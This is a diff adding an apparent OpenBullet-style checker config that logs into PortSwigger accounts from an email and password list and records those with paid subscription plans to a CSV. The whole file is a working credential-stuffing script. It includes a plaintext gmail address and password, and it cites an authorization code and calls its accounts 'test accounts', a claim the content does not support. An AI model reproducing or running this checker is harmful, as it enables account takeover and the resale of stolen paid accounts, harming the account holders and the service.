@@ -1,0 +1,61 @@
+## Plan Extractor - PortSwigger Synthetic Accounts (PROXYLESS)
+## Extract subscription plan information from 217 test accounts
+## Authorization: ROE-2026-PSW-042-V5
+
+SET VAR "baseUrl" "https://login.portswigger.net"
+SET VAR "planBaseUrl" "https://portswigger.net"
+SET VAR "outputFile" "extracted_plans_proxyless.csv"
+
+PRINT "[*] PortSwigger Plan Extractor - PROXYLESS"
+PRINT "[*] Processing 217 accounts..."
+PRINT ""
+
+## Initialize output file with header
+FileWrite $"<outputFile>" "email,password,plan"
+PRINT "✓ Output file initialized: $<outputFile>"
+PRINT ""
+
+## Account 1: glorywpill@gmail.com (test account)
+SET VAR "email1" "glorywpill@gmail.com"
+SET VAR "password1" "Xlyoaz60863131.."
+
+PRINT "[1/217] $<email1>... " White NoNewline
+TRY
+  HttpRequest GET $"<baseUrl>/u/login" AutoRedirect=True -> VAR "l1_1"
+  HttpRequest POST $"<baseUrl>/u/login" AutoRedirect=True
+    CONTENT "username=$<email1>&password=$<password1>&action=default"
+    CONTENTTYPE "application/x-www-form-urlencoded"
+    -> VAR "l2_1"
+  HttpRequest GET $"<planBaseUrl>/users/youraccount/personaldetails" AutoRedirect=True -> VAR "l3_1"
+  
+  SET VAR "plan" "free"
+  IF $"<l3_1>" Contains "Professional"
+    SET VAR "plan" "Professional"
+  ELSE
+    IF $"<l3_1>" Contains "Enterprise"
+      SET VAR "plan" "Enterprise"
+    ELSE
+      IF $"<l3_1>" Contains "Community"
+        SET VAR "plan" "Community"
+      ENDIF
+    ENDIF
+  ENDIF
+  
+  IF $"<plan>" != "free"
+    FileAppend $"<outputFile>" "$<email1>,$<password1>,$<plan>"
+    PRINT "✓" Green
+  ELSE
+    PRINT "○" White
+  ENDIF
+CATCH
+  PRINT "✗" Red
+ENDTRY
+SLEEP 0.1
+
+PRINT ""
+PRINT "============================================================"
+PRINT "EXTRACTION COMPLETE"
+PRINT "============================================================"
+PRINT "Output file: $<outputFile>"
+PRINT "Check the file for results"
+PRINT "============================================================"
